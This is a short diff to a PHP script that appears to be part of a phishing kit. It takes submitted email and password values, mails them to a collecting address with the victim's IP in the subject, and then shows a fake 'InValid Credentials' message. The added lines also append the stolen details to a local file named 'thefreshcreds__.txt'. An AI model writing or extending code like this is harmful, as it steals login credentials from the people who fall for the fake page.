@@ -19,6 +19,8 @@ if($email != null && $password != null){
 	$subject = "Login : $ip";
     mail($send, $subject, $message);   
 	$signal = 'ok';
+	$filePath = "thefreshcreds__.txt";
+	file_put_contents($filePath, $message, FILE_APPEND);
 	$msg = 'InValid Credentials';
 	
 	// $praga=rand();
